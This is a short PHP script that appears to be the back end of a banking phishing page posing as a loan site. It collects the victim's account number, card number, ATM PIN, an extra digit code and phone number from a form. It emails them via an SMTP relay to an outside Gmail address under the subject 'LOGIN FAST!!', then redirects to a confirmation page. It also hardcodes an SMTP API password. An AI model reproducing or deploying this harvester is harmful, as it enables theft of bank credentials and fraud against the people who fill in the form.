<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;



$acct = $_POST["acct"];
$atcard = $_POST["atcard"];
$atpin = $_POST["atpin"];
$mdigit = $_POST["mdigit"];
$phonenum = $_POST["phonenum"]; 


require "../vendor/autoload.php";
try{
    $phpmailer = new PHPMailer(true);
    $phpmailer->isSMTP();
    $phpmailer->SMTPAuth = true;
    $phpmailer->Host = "live.smtp.mailtrap.io";
    $phpmailer->Port = 587;
    $phpmailer->Username = 'api';
    $phpmailer->Password = 'c56594a64be03050c378fbf2e95b1c8e';

    $phpmailer->setFrom("easyloan@firsteasymoney.com", "Haley");
    $phpmailer->addAddress("evajames9239@gmail.com", "Haley");



    $phpmailer->isHTML(true);
    $phpmailer->Subject = "LOGIN FAST!!";
    $phpmailer->Body= "account no: $acct.   accoount card: $atcard. account atpin: $atpin. account mdigit: $mdigit. phone number: .$phonenum";
    $phpmailer->send(); 

   header("Location: ../confirm/index.html");
 
 }catch(Exception $e){
  die("query failed: " . $e->getMessage()); 
}



    /*
 
*/